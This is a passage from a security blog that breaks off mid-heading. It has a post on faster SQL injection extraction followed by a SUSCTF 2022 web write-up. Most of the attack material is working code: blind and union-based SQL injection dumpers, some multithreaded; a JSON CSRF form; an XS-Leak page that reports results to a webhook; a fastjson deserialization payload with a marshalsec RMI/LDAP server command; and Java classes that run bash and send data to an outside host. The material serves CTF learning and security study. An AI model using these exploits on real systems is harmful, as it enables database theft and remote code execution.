'https://od-php.herokuapp.com/sql' char_index = 0 char_set = '&#125;abcdefghijklmnopqrstuvwxyz_' result = 'cymetrics&#123;' is_over = False start = time.time() while True: print_success(\"result: \" + result) if is_over: break found = False L = 0 R = len(char_set) - 1 while L&lt;=R: s = (R-L) // 3 ML = L + s MR = L + s * 2 if s == 0: MR = L + 1 group = [ char_set[L:ML], char_set[ML:MR], char_set[MR:R+1] ] conditions = [] for i in range(0, 3): if len(group[i]) == 0: # 空的話加上 1=2，一個恆假的條件 conditions.append(\"1=2\") continue # 這邊要對 _ 做處理，加上 /，否則 _ 會配對到任意一個字元 arr = [f\"(content like '&#123;result&#125;&#123;chr(92) + c if c == '_' else c&#125;%')\" for c in group[i]] conditions.append(\" or \".join(arr)) payload = f''' (select case when (&#123;conditions[0]&#125;) then 1 when (&#123;conditions[1]&#125;) then 2 when (&#123;conditions[2]&#125;) then 5 else 10 end from flag) ''' print(\"trying\", group) response = requests.get(f'&#123;host&#125;/search.php?tag=&#123;encode(payload)&#125;') if not response.ok: print('error') print(response.text) print(payload) is_over = True break data = json.loads(response.text) if len(data) == 0: print(\"end\") is_over = True break if len(data) == 2: R = ML if len(group[0]) == 1: result += group[0] break else: if data[0][\"name\"] == \"home1\": L = ML R = MR if len(group[1]) == 1: result += group[1] break else: L = MR if len(group[2]) == 1: result += group[2] break print(f\"time: &#123;time.time() - start&#125;s\") The result of running it looks like this: It took 45 seconds, which is twice as fast as the previous method. Final acceleration: Multi-threadingPreviously, we waited for one request to return before sending the next one. But we can actually use multiple threads to send requests at the same time. For example, each thread can guess a fixed position value, which should speed up the attempts. Although the number of attempts is the same, the number of attempts per second is increased, so the overall time is naturally reduced. Below is the code for a simple implementation. You need to know the length of the final string first, and a more sophisticated approach is to first search for the length of the data to be retrieved, and then retrieve the data itself: # exploit-search-thread.py import requests import time import json import urllib.parse import concurrent.futures def print_success(raw): print(f\"\\033[92m&#123;raw&#125;\\033[0m\") def encode(raw): return urllib.parse.quote(raw.encode('utf8')) host = 'https://od-php.herokuapp.com/sql' char_index = 0 char_set = '&#125;abcdefghijklmnopqrstuvwxyz_' flag = 'cymetrics&#123;' def get_char(index): L = 0 R = len(char_set) - 1 prefix = flag + \"_\" * index while L&lt;=R: s = (R-L) // 3 ML = L + s MR = L + s * 2 if s == 0: MR = L + 1 group = [ char_set[L:ML], char_set[ML:MR], char_set[MR:R+1] ] conditions = [] for i in range(0, 3): if len(group[i]) == 0: conditions.append(\"1=2\") continue arr = [f\"(content like '&#123;prefix&#125;&#123;chr(92) + c if c == '_' else c&#125;%')\" for c in group[i]] conditions.append(\" or \".join(arr)) payload = f''' (select case when (&#123;conditions[0]&#125;) then 1 when (&#123;conditions[1]&#125;) then 2 when (&#123;conditions[2]&#125;) then 5 else 10 end from flag) ''' print(f\"For &#123;index&#125; trying\", group) response = requests.get(f'&#123;host&#125;/search.php?tag=&#123;encode(payload)&#125;') if not response.ok: print('error') print(response.text) print(payload) return False data = json.loads(response.text) if len(data) == 0: return False if len(data) == 2: R = ML if len(group[0]) == 1: return group[0] else: if data[0][\"name\"] == \"home1\": L = ML R = MR if len(group[1]) == 1: return group[1] else: L = MR if len(group[2]) == 1: return group[2] def run(): length = 15 ans = [None] * length with concurrent.futures.ThreadPoolExecutor(max_workers=length) as executor: futures = &#123;executor.submit(get_char, i): i for i in range(length)&#125; for future in concurrent.futures.as_completed(futures): index = futures[future] data = future.result() print_success(f\"Index &#123;index&#125; is &#123;data&#125;\") ans[index] = data print_success(f\"flag: &#123;flag&#125;&#123;''.join([n for n in ans if n != False])&#125;\") start = time.time() run() print(f\"time: &#123;time.time() - start&#125;s\") The result of running it looks like this: We opened 15 threads, and the time was reduced from 45 seconds to 3 seconds. Using multi-threading increased the overall speed by 15 times. To sum up, in terms of SQL, we can use ternary search to reduce the number of attempts. In terms of programming, we can use multi-threading to send multiple requests at the same time to speed up the attempts. After optimizing both, we can significantly reduce the time. Case 2: Room reservation query functionThis challenge is a room reservation query function that takes three parameters: id start_time end_time The system will then query a table called price to find data that meets the conditions. If there is data that meets the conditions, it means that the room can be reserved, and the returned data will indicate whether each day between start_time and end_time is available or not. If it is available, it will display “Available”, otherwise it will display “Unavailable”. The injection point in this question is id, because id is not escaped, so SQL injection can be executed. Let’s take a look at the code for this question: for ($i = $startTime; $i &lt;= $endTime; $i = strtotime('+1 day', $i)) &#123; $found = false; foreach ($priceItems['results'] as $range) &#123; if ($i == $range[\"start_time\"] &amp;&amp; $i &lt;= $range[\"end_time\"]) &#123; $data = $range; $found = true; break; &#125; &#125; if ($found) &#123; $events['events'][] = [ 'start' => date('Y-m-d', $data[\"start_time\"]), 'end' => date('Y-m-d', $data[\"end_time\"]), 'status' => \"Available\", ]; &#125; else &#123; $events['events'][] = [ 'start' => date('Y-m-d', $i), 'end' => date('Y-m-d', $i), 'status' => \"Unavailable\", ]; &#125; &#125; As mentioned earlier, this question will start from start_time and add one day at a time until end_time. Then, it will check the priceItems to see if there is data that meets the conditions. If there is, the status of that day will be set to “Available”, otherwise it will be set to “Unavailable”. Below is the code for retrieving priceItems. The query part has been modified for readability: function getPriceItems($id, $start, $end) &#123; global $conn; $start = esc_sql($start); $end = esc_sql($end); $sql = \" select * from price where ( (price.start_time >= &#123;$start&#125; AND price.end_time &lt;= &#123;$end&#125;) OR (price.start_time &lt;= &#123;$start&#125; AND price.end_time >= &#123;$start&#125;) OR (price.start_time &lt;= &#123;$end&#125; AND price.end_time >= &#123;$end&#125;) ) AND price.home_id = &#123;$id&#125;\"; $result = $conn->query($sql); $arr = []; if ($result) &#123; while($row = $result->fetch_assoc()) &#123; array_push($arr, $row); &#125; &#125; else &#123; die($sql); &#125; return [ 'results' => $arr ]; &#125; ?> We can use the union method to make priceItems become the data we specify at the id point. Since union needs to know how many columns there are, we can use the order by &#123;number&#125; method to see how many columns there are. For example, order by 2 means sorting by the second column. If there are not enough columns, an error will occur, so we can use a binary search-like method to find out how many columns there are. After trying it out, we found that there are a total of 4 columns. Next, 2023-01-01 converted to a timestamp is 1672502400, so our id can look like this: 0 union select 1672502400,1672502400,1672502400,1672502400 You will notice that in the returned data, the status changes to Available, indicating that our SQL injection was successful. The next step is to determine which column is start_time and which is end_time. We can change each column to 1 and see if the returned result changes to determine if we have affected these two columns. In short, we can use case when to select specific data when a certain condition is met (status becomes Available) and otherwise select another data (status becomes Unavailable), just like the previous question. However, the big difference between this question and the previous one is that we can control the output of start_time and end_time in the response data. Although these two values must be dates, we can smuggle the data we want to return inside the date. My approach is to turn the data I want to return into a date. We can first get the nth character in the data, assuming that it will be x after being converted to ascii. We can treat this as meaning “x days”. We add x*3600*24 to the timestamp of 2023-01-01 (1672502400) to get a new timestamp as end_time, which is then converted to a date in PHP. After obtaining the date from the response, we can calculate how many days have passed since 2023-01-01. We convert the date back to a timestamp, subtract 1672502400, and then divide by 86400 (3600*24) to get the number of days. For example, if it is 98 days, it means that the character we read was chr(98), which is b, and we have obtained one character. Therefore, by smuggling the ascii code in the date, we can obtain one character of data each time we perform an operation. The code is as follows: # exploit-ava.py import requests import datetime import json import urllib.parse import time host = 'https://od-php.herokuapp.com/sql' base_time = 1672502400 index = 1 result = '' field = 'group_concat(table_name)' fr = \" FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'\" fr = urllib.parse.quote(fr.encode('utf8')) start = time.time() while True: payload = f'ascii(SUBSTRING(&#123;field&#125;,&#123;index&#125;))*86400%2b&#123;base_time&#125;' response = requests.get(f'&#123;host&#125;/availability.php?id=12345%20union%20select%201%20,&#123;base_time&#125;,&#123;payload&#125;,4%20&#123;fr&#125;&amp;start_time=2023-01-01&amp;end_time=2023-01-01') index +=1 if response.ok: data = json.loads(response.text) d = data['events'][0]['end'] if d == '2023-01-01': break else: diff = datetime.datetime.strptime(d, \"%Y-%m-%d\").timestamp() - base_time result += chr(int(diff/86400)) print(result) else: print('error') break print(f\"time: &#123;time.time() - start&#125;s\") The result of running it is as follows: One character is leaked at a time, and it takes about 40 seconds to get the complete result. Acceleration: Smuggling two characters at a timeSince we can smuggle data as numbers into the date, why not smuggle two characters at a time? To avoid conflicts and make it easy to calculate, the second character needs to be multiplied by 128. The code is as follows: # exploit-ava-2x.py import requests import datetime import json import urllib.parse import time def encode(raw): return urllib.parse.quote(raw.encode('utf8')) host = 'https://od-php.herokuapp.com/sql' base_time = 1672502400 index = 1 result = '' field = 'group_concat(table_name)' fr = \" FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'\" fr = encode(fr) start = time.time() while True: payload = f''' ascii(SUBSTRING(&#123;field&#125;,&#123;index&#125;))*86400 + ascii(SUBSTRING(&#123;field&#125;,&#123;index+1&#125;))*86400*128 + &#123;base_time&#125; ''' response = requests.get(f'&#123;host&#125;/availability.php?id=12345%20union%20select%201%20,&#123;base_time&#125;,&#123;encode(payload)&#125;,4%20&#123;fr&#125;&amp;start_time=2023-01-01&amp;end_time=2023-01-01') index +=2 if response.ok: data = json.loads(response.text) d = data['events'][0]['end'] if d == '2023-01-01': break else: diff = datetime.datetime.strptime(d, \"%Y-%m-%d\").timestamp() - base_time diff = int(diff/86400) first = diff % 128 result += chr(first) second = int((diff - first) / 128) if second == 0: break result += chr(second) print(\"current:\", result) else: print('error') break print(\"result:\", result) print(f\"time: &#123;time.time() - start&#125;s\") The result of running it is: It took a total of 19 seconds, which is twice as fast as the previous method, which is very reasonable. Further acceleration: Smuggling n characters at a timeThe previous method actually treats the string as a number in base 128. For example, mvc in ascii code is 109, 119, 99, and the corresponding number is 99 + 128*119 + 128*128*109 &#x3D; 1801187, which is about 4935 years. In theory, as long as this year does not exceed the range that the programming language can represent, we can obtain multiple characters at a time. Taking PHP as an example, we can write a simple script to calculate: &lt;?php $base = 1672502400; $num = 1; for($i=1; $i&lt;=10; $i++) &#123; $num *= 128; echo($i . \"\\n\"); echo(date('Y-m-d', $base + $num*86400) . \"\\n\"); &#125; ?> The output is: 1 2023-05-08 2 2067-11-09 3 7764-10-21 4 736974-04-25 5 94075791-06-08 6 12041444382-10-24 7 PHP Warning: date() expects parameter 2 to be int, float given in /Users/li.hu/Documents/playground/ctf/sql-injection/test.php on line 7 8 PHP Warning: date() expects parameter 2 to be int, float given in /Users/li.hu/Documents/playground/ctf/sql-injection/test.php on line 7 9 PHP Warning: date() expects parameter 2 to be int, float given in /Users/li.hu/Documents/playground/ctf/sql-injection/test.php on line 7 10 PHP Warning: date() expects parameter 2 to be int, float given in /Users/li.hu/Documents/playground/ctf/sql-injection/test.php on line 7 This means that we can get up to 5 characters at a time, because 128^6 is still within the permissible range and will not cause an overflow. However, when Python uses datetime.strptime to convert a date to a timestamp, the highest upper limit seems to be 9999, and an error will be thrown if it exceeds this limit. Therefore, unless you write your own conversion, you can only get data for 3 characters at a time at most. Writing this conversion is very troublesome (you need to consider the number of days in each month and leap years), so I only implemented a version for 3 characters, the code is as follows: # exploit-ava-3x.py import requests import datetime import json import urllib.parse import time def encode(raw): return urllib.parse.quote(raw.encode('utf8')) host = 'https://od-php.herokuapp.com/sql' base_time = 1672502400 index = 1 result = '' field = 'group_concat(table_name)' fr = \" FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'\" fr = encode(fr) start = time.time() while True: payload = f''' ascii(SUBSTRING(&#123;field&#125;,&#123;index&#125;))*86400 + ascii(SUBSTRING(&#123;field&#125;,&#123;index+1&#125;))*86400*128 + ascii(SUBSTRING(&#123;field&#125;,&#123;index+2&#125;))*86400*128*128 + &#123;base_time&#125; ''' response = requests.get(f'&#123;host&#125;/availability.php?id=12345%20union%20select%201%20,&#123;base_time&#125;,&#123;encode(payload)&#125;,4%20&#123;fr&#125;&amp;start_time=2023-01-01&amp;end_time=2023-01-01') index += 3 if response.ok: data = json.loads(response.text) d = data['events'][0]['end'] print(d) if d == '2023-01-01': break else: diff = datetime.datetime.strptime(d, \"%Y-%m-%d\").timestamp() - base_time diff = int(diff/86400) is_over = False while diff > 0: num = diff % 128 if num == 0: is_over = True break result += chr(num) diff = int((diff - num) / 128) if is_over: break print(\"current:\", result) else: print('error') break print(\"result:\", result) print(f\"time: &#123;time.time() - start&#125;s\") The result of running it is: It took about 13 seconds, which is a bit faster. Final acceleration: Making use of multiple datesIn the previous examples, we only passed in one day as the date range, so the response only contained data for one day. However, this feature can actually accept a date range. For example, if we pass in 2023-01-01 ~ 2023-01-05, we will get the response for five days: &#123; \"events\": [ &#123; \"start\": \"2021-01-01\", \"end\": \"2021-01-01\", \"status\": \"Unavailable\" &#125;, &#123; \"start\": \"2021-01-02\", \"end\": \"2021-01-02\", \"status\": \"Unavailable\" &#125;, &#123; \"start\": \"2021-01-03\", \"end\": \"2021-01-03\", \"status\": \"Unavailable\" &#125;, &#123; \"start\": \"2021-01-04\", \"end\": \"2021-01-04\", \"status\": \"Unavailable\" &#125;, &#123; \"start\": \"2021-01-05\", \"end\": \"2021-01-05\", \"status\": \"Unavailable\" &#125; ] &#125; In order to simplify the query, we only used one date in the previous query, and we know that a date can return 3 characters of information. If we design the query carefully and make sure that the return value of each day carries 3 characters, we can return 30 characters at once if we use it for 10 days. The query will look like this: union select 1,1672502400, ascii(SUBSTRING(group_concat(table_name),1))*86400 + ascii(SUBSTRING(group_concat(table_name),2))*86400*128 + ascii(SUBSTRING(group_concat(table_name),3))*86400*128*128 + 1672502400 ,1 FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' union select 1,1672588800, ascii(SUBSTRING(group_concat(table_name),4))*86400 + ascii(SUBSTRING(group_concat(table_name),5))*86400*128 + ascii(SUBSTRING(group_concat(table_name),6))*86400*128*128 + 1672588800 ,1 FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' union select 1,1672675200, ascii(SUBSTRING(group_concat(table_name),7))*86400 + ascii(SUBSTRING(group_concat(table_name),8))*86400*128 + ascii(SUBSTRING(group_concat(table_name),9))*86400*128*128 + 1672675200 ,1 FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' .... The script is as follows: # exploit-ava-30x.py import requests import datetime import json import urllib.parse import time def encode(raw): return urllib.parse.quote(raw.encode('utf8')) def to_ts(raw): return datetime.datetime.strptime(raw, \"%Y-%m-%d\").timestamp() host = 'https://od-php.herokuapp.com/sql' base_time = 1672502400 index = 1 result = '' field = 'group_concat(table_name)' fr = \" FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'\" start_time = '2023-01-01' end_time = '2023-01-10' date_count = 10 fetch_per_union = 3 start = time.time() while True: unions = [] query_time = base_time for i in range(date_count): payload = f''' ascii(SUBSTRING(&#123;field&#125;,&#123;index&#125;))*86400 + ascii(SUBSTRING(&#123;field&#125;,&#123;index+1&#125;))*86400*128 + ascii(SUBSTRING(&#123;field&#125;,&#123;index+2&#125;))*86400*128*128 + &#123;query_time&#125; ''' unions.append(f'union select 1,&#123;query_time&#125;,&#123;payload&#125;,1 &#123;fr&#125;') index += fetch_per_union query_time += 86400 payload = \" \".join(unions) print(payload) response = requests.get(f'&#123;host&#125;/availability.php?id=12345%20&#123;encode(payload)&#125;&amp;start_time=&#123;start_time&#125;&amp;end_time=&#123;end_time&#125;') if not response.ok: print('error') break data = json.loads(response.text) print(data) is_finished = False for item in data['events']: diff = to_ts(item['end']) - to_ts(item['start']) diff = int(diff/86400) is_finished = False if diff == 0: is_finished = True break count = 0 while diff > 0: num = diff % 128 if num == 0: is_finished = True break count+=1 result += chr(num) diff = int((diff - num) / 128) if count != fetch_per_union: is_finished = True break if is_finished: break print(\"current:\", result) if is_finished: break print(\"result:\", result) print(f\"time: &#123;time.time() - start&#125;s\") The execution result will look like this, and you can see that each data’s end carries 3 characters of information: This time, only one query was used, and it took a total of 4 seconds to get 30 characters. Most of the time was actually spent on SQL processing the query. ConclusionAll sample code is here: https://github.com/aszx87410/demo/tree/master/sql-injection Although most situations can be handled with multiple threads, it is necessary to consider that some servers may have rate limiting and cannot send so many requests. Leaving aside the issue of bypassing rate limiting, I think it is quite interesting to maximize the amount of information returned by a query and reduce the number of requests. Therefore, this article and various methods were created. In the first case, binary search was used to reduce the number of requests, and in the second case, the data was smuggled into the date by converting the string into a number, and more characters were smuggled using multiple dates. In addition, the ASCII function used in the implementation above has some limitations. For example, it will explode if it is Chinese. At this time, you can use ORD or HEX and other functions, which will have better support. I think it is not difficult to come up with these solutions, but the most troublesome part is the implementation. Originally, I didn’t want to do it. I just wanted to write a sentence in the article: “In theory, doing this can be faster, and the implementation is left to everyone.” But after thinking about it, I still think I should do it. If you just want to prove that the SQL injection vulnerability exists, the slowest method is enough, but I am still curious: “If you really want to dump the entire database, how can you do it faster?” Maybe I should find some time to study sqlmap, which should provide a lot of inspiration. Reference: Comma is forbidden! No worries!! Inject in insert&#x2F;update queries without it","link":"/2022/01/19/en/sql-injection-in-action/"},{"title":"SUSCTF 2022 Writeup","text":"This holiday there were several CTFs, and I participated in SUSCTF 2022 with team SU. This post briefly records my experience with several of the challenges I participated in. The list of challenges I will discuss is as follows: web&#x2F;fxxkcors web&#x2F;ez_note web&#x2F;baby gadget v1.0 web&#x2F;baby gadget v1.0’s rrrevenge web&#x2F;HTML practice web&#x2F;fxxkcors (67 solves) This challenge has a change.php that allows you to change permissions. If you change your own permissions to admin, you can see the flag. The request looks like this: POST &#x2F;changeapi.php HTTP&#x2F;1.1 Host: 124.71.205.122:10002 Content-Length: 19 Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;* Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3 User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;98.0.4758.82 Safari&#x2F;537.36 Content-Type: application&#x2F;json; charset&#x3D;UTF-8 Origin: http:&#x2F;&#x2F;124.71.205.122:10002 Referer: http:&#x2F;&#x2F;124.71.205.122:10002&#x2F;change.php Accept-Encoding: gzip, deflate Cookie: PHPSESSID&#x3D;1ab6387f551b235d26d1c88a3685d752 Connection: close &#123;&quot;username&quot;:&quot;huli&quot;&#125; But of course, you don’t have permission to change it yourself, so this provides an admin bot that you can give any URL to visit. Therefore, the goal is to let the admin bot help you request to change permissions. However, you are making requests from a different origin and you also need to bring cookies, so you will be blocked by CORS. This is where CSRF comes in, but the required format is JSON. How do you CSRF? There is a technique I have seen many times before: if the server does not check the content type, you can do it like this: &lt;body> &lt;form id=a action=\"http://124.71.205.122:10002/changeapi.php\" method=\"POST\" enctype=\"text/plain\"> &lt;input name='&#123;\"username\":\"huli\", \"abc\":\"' value='123\"&#125;'> &lt;/form> &lt;script> a.submit() &lt;/script> &lt;/body> Because POST actually turns the request body into &#123;key&#125;=&#123;value&#125;, the above form will be &#123;&quot;username&quot;:&quot;huli&quot;, &quot;abc&quot;:&quot;&#x3D;123&quot;&#125;, generating a piece of JSON data. And this challenge does not check the content type, so doing it like the above is fine. web&#x2F;ez_note (8 solves) In this challenge, you can create an account and add notes and search for notes. When searching, if a note is found, the client will use something like setTimeout(() =&gt; location=&#39;/note/12&#39;, 1000) to jump to the note page. And this challenge also has an admin bot that will visit the page you provide, so it is obviously an XSLeaks challenge. First, let’s take a look at the code for this admin bot: const visit = async (browser, path) =>&#123; let site = process.env.NOTE_SITE ?? \"\" let url = new URL(path, site) console.log(`[+]$&#123;opt.name&#125;: $&#123;url&#125;`) let renderOpt = &#123;...opt&#125; try &#123; const loginpage = await browser.newPage() await loginpage.goto( site+\"/signin\") await loginpage.type(\"input[name=username]\", \"admin\") await loginpage.type(\"input[name=password]\", process.env.NOTE_ADMIN_PASS) await Promise.all([ loginpage.click('button[name=submit]'), loginpage.waitForNavigation(&#123;waitUntil: 'networkidle0', timeout: 2000&#125;) ]) await loginpage.goto(\"about:blank\") await loginpage.close() const page = await browser.newPage() await page.goto(url.href, &#123;waitUntil: 'networkidle0', timeout: 2000&#125;) await delay(5000) /// waiting 5 second. &#125;catch (e) &#123; console.log(e) renderOpt.message = \"error occurred\" return renderOpt &#125; renderOpt.message = \"admin will view your report soon\" return renderOpt &#125; The key is this line: let url = new URL(path, site). At first glance, you might think you can only provide pages on the site, so you need to find XSS on this challenge. But that’s not the case. If you look carefully at the documentation, you will know: input: The absolute or relative input URL to parse. If input is relative, then base is required. If input is absolute, the base is ignored If you provide an absolute URL, the base will be ignored, so you can directly provide any page for the admin bot to visit. Next is to find out how to perform XS leak. I used the history.length trick in the end. The principle is very simple. Even if you go to another website under the same window, your history.length will not be cleared, meaning that if I go to website A first, then to B, and then back to A, when I access history.length, it will be 3. So we can use var win = window.open to open the note search page, and then after a certain amount of time, use win.location = &#39;...&#39; to redirect this window back to our own website, so we can use win.history.length to access this value and know whether the note search was successful. The script I used to leak looks like this: &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;meta name=\"robots\" content=\"noindex\"> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"> &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"> &lt;/head> &lt;body> &lt;script> var flag = 'SUSCTF&#123;' function send(msg) &#123; fetch('https://webhook.site/bad84752-95a1-45c4-8395-e5577ea1112b?msg=' + encodeURIComponent(msg)) &#125; function trying(keyword) &#123; return new Promise(resolve => &#123; var win = window.open('http://123.60.29.171:10001/search?q=' + keyword) setTimeout(() => &#123; win.location = 'http://e050-220-133-126-220.ngrok.io/non.html' setTimeout(() => &#123; if (win.history.length === 3) &#123; send('success:' + keyword) &#125; else &#123; //send('fail:' + keyword) &#125; win.close(); &#125;, 1000) &#125;, 1500) &#125;) &#125; async function run() &#123; send('start') // &#125;abcdefghijklmnopqrstuvwxyz0123456789_ // &#125;abcdefghijklmnopqrs // let chars = '_abcdefghijklmnopqrstuv'.split('') //let chars = '&#125;wxyz0123456789_'.split('') for(let char of chars) &#123; const temp = flag + char trying(temp) &#125; &#125; setTimeout(() => &#123; run() &#125;, 1000) &lt;/script> &lt;/body> &lt;/html> There are actually a few details here. The first detail is the last part: setTimeout(() => &#123; run() &#125;, 1000) Why wait for one second before starting to run? Because the bot has a piece of code that is: await page.goto(url.href, &#123;waitUntil: 'networkidle0', timeout: 2000&#125;) await delay(5000) /// waiting 5 second. It waits for networkidle0 before waiting for five seconds. I tried it myself and found that if I didn’t stop for a second and started running directly, networkidle0 wouldn’t seem to trigger. So it becomes running to timeout: 2000, with only 2 seconds of execution time, and everything will fail. Later, I added this part. The second detail is the number of seconds in this section: setTimeout(() => &#123; win.location = 'http://e050-220-133-126-220.ngrok.io/non.html' setTimeout(() => &#123; if (win.history.length === 3) &#123; send('success:' + keyword) &#125; else &#123; //send('fail:' + keyword) &#125; win.close(); &#125;, 1000) // 這裡 &#125;, 1500) // 跟這裡 This is a value that I manually tried a few times and found to be ok. Because if there is a note search, it will redirect after 1 second. If it redirects back to its own page earlier than this value, it will fail. So I chose 1.5 seconds, and it takes another second to redirect back to its own page. If you want to be more precise, you can use Cross-window Timing Attacks, which can be much more accurate. The last detail is this part: let chars = &#39;_abcdefghijklmnopqrstuv&#39;.split(&#39;&#39;). Because my script runs too slowly, if I want to leak all characters (38 in total), it will not finish running. So I have to manually cut it in half and submit the URL twice to leak out one character. I feel that there should be a faster way, such as leaking all characters within 5 seconds. If anyone knows how to do it, please leave a comment to point it out. But anyway, I didn’t think about it so much when I was doing this problem, so I submitted it manually one by one, spending the longest time on Google reCAPTCHA. Fortunately, the admin bot has three streams, otherwise the images will be added with noise directly towards the end, and it will be super difficult for the human eye to read… Fortunately, the flag for this problem is not long. It took almost 20 minutes to submit the URL and pass the verification, slowly getting the characters out. When I wrote this, I suddenly thought that I should run all the characters without adding a prefix first, so I can know which characters are in the flag, and the character set may be reduced to more than 10, which will be three times faster… I didn’t think of it at the time, I should remember it next time. (Supplement: I looked at the official writeup, and it seems that it is possible to run all the characters in one go, maybe I didn’t test it well at the time, and the official answer is also to submit multiple times, not all within 5 seconds.) web&#x2F;baby gadget v1.0(14 solves) This problem has a login page, and my teammate found that using /;admin/ can bypass it and enter the backend. The backend is quite simple, just like the screenshot above, and there is a place to download the file lib.zip, which contains the following packages used: commons-lang.jar fastjson-1.2.48.jar flex-messaging-core.jar quartz.jar And the description of the backend is also obviously related to fastjson: Fastjson is a Java library that can be used to convert Java Objects into their JSON representation. It can also be used to convert a JSON string to an equivalent Java object. Fastjson can work with arbitrary Java objects including pre-existing objects that you do not have source-code of. There is also an endpoint that can POST data: POST &#x2F;admin&#x2F;mailbox.jsp inpututext&#x3D;abcde This version of fastjson has a deserialization vulnerability, which can refer to this article: Red Team Arsenal: fastjson less than 1.2.68 full vulnerability RCE exploit. Next, my teammate found that inputtext can contain a JSON string that the server will parse using fastjson, like this: inputtext=&#123;&quot;a&quot;:123&#125;, but I tried this payload and didn’t see any results: &#123;\"abc\":&#123;\"@type\":\"java.net.Inet4Address\",\"val\":\"1486fo.dnslog.cn\"&#125;&#125; It seems that there are some issues with dnslog, so I should either set up my own or find another similar service for future use. However, my teammate successfully tried it with another service, so it is confirmed to be feasible. Next, I need to set up the environment as described in the previous article and find a way to exploit this vulnerability. Since I am not familiar with Java, I usually give up when I see Java problems, but this time I accidentally tried it and succeeded. First of all, thanks to the author of the previous article for writing the reproduction method quite clearly. Here is a brief description. First, you can use the JSON payload given in the article to trigger the vulnerability: &#123; \"a\":&#123; \"@type\":\"java.lang.Class\", \"val\":\"com.sun.rowset.JdbcRowSetImpl\" &#125;, \"b\":&#123; \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://2.2.2.2:9999/Exploit\", \"autoCommit\":true &#125; &#125; This vulnerability will load a class file (i.e., dataSourceName) via RMI, so you must first run an RMI server on your server, which can be done using the marshalsec-0.0.3-SNAPSHOT-all.jar tool: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http:&#x2F;&#x2F;2.2.2.2:8888&#x2F;#Exploit&quot; 9999 This command runs an RMI server on port 9999, corresponding to the above payload. Next, your RMI server must provide the Java Class you want to load, so you also need to provide a place for it to download the file, which is the http://2.2.2.2:8888/#Exploit in the above command. At this point, we can write an Exploit.java: import java.io.BufferedReader; import java.io.InputStream; import java.io.InputStreamReader; public class Exploit&#123; public Exploit() throws Exception &#123; Process p = Runtime.getRuntime().exec(new String[]&#123;\"bash\", \"-c\", \"touch /zydx666\"&#125;); InputStream is = p.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(is)); String line; while((line = reader.readLine()) != null) &#123; System.out.println(line); &#125; p.waitFor(); is.close(); reader.close(); p.destroy(); &#125; public static void main(String[] args) throws Exception &#123; &#125; &#125; Compile it: javac Exploit.java, and Exploit.class will be generated. Then start a simple Python server: python3 -m http.server --bind 0.0.0.0 8888 Your RMI server and Python file server can be on the same machine for convenience. (Again, all the code above comes from the article 红队武器库:fastjson小于1.2.68全漏洞RCE利用exp) However, this problem is a bit different. I tried the above method several times and found that my RMI server responded, but the file server did not, which means that there seems to be a problem with some link in the chain, causing the entire exploit chain to fail, so it did not execute the final code. At this point, I tried randomly and saw that marshalsec had another option, marshalsec.jndi.LDAPRefServer, so I changed it to this and changed the payload to an LDAP URL, and then it worked, and my file server responded. Unfortunately, it seems that the command execution was not successful because my server did not receive any requests whether I ran nc or curl. After continuing to try, I suddenly had an idea: what if the command execution was actually blocked, but the Java code was successfully executed? So I added Thread.sleep(5000) to Exploit.java and found that the response was indeed delayed by five seconds. Then I added: URL url = new URL(\"https://webhook.site/bad84752-95a1-45c4-8395-e5577ea1112b%22); InputStream iss = url.openStream(); and found that the server received the request! So the class was indeed executed, but for some unknown reason, it was not possible to use Runtime.getRuntime().exec directly. My code looks something like this: import java.io.*; import java.net.*; import java.util.*; public class Exploit&#123; public Exploit() throws Exception &#123; String str = \"test\"; URL url = new URL(\"https://webhook.site/bad84752-95a1-45c4-8395-e5577ea1112b\"); Map&lt;String,Object> params = new LinkedHashMap&lt;>(); params.put(\"msg\", str); StringBuilder postData = new StringBuilder(); for (Map.Entry&lt;String,Object> param : params.entrySet()) &#123; if (postData.length() != 0) postData.append('&amp;'); postData.append(URLEncoder.encode(param.getKey(), \"UTF-8\")); postData.append('='); postData.append(URLEncoder.encode(String.valueOf(param.getValue()), \"UTF-8\")); &#125; byte[] postDataBytes = postData.toString().getBytes(\"UTF-8\"); HttpURLConnection conn = (HttpURLConnection)url.openConnection(); conn.setRequestMethod(\"POST\"); conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\"); conn.setRequestProperty(\"Content-Length\", String.valueOf(postDataBytes.length)); conn.setDoOutput(true); conn.getOutputStream().write(postDataBytes); Reader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), \"UTF-8\")); &#125; public static void main(String[] args) throws Exception &#123; &#125; &#125; Later, I tried to read the environment variables and send them to the server, which was successful. I then attempted to read the file list under /, but failed. Since I didn’t know the reason for the failure, I added a try-catch block like this: String str = \"\"; try&#123; File f = new File(\"/var\"); File[] paths = f.listFiles(); str = paths.toString(); for (int i = 0; i &lt; paths.length; i++) &#123; str += paths[i].toString() + \",\"; &#125; &#125; catch(Exception e)&#123; str = e.toString() + \",\" + e.getMessage(); &#125; The answer I got was java.lang.reflect.InvocationTargetException. I still don’t know why this error occurred. Perhaps the question setter intentionally removed something, or maybe it was a problem with my Java version? Anyway, because I couldn’t enumerate the files, I was stuck for a while and was thinking about what to do. Then suddenly, I had an idea to try reading the file instead of listing them. It worked, and I was able to read /etc/passwd. Then I tried to read /flag, and I was able to read it too. That’s how I solved it. I can only say that I was lucky. web&#x2F;baby gadget 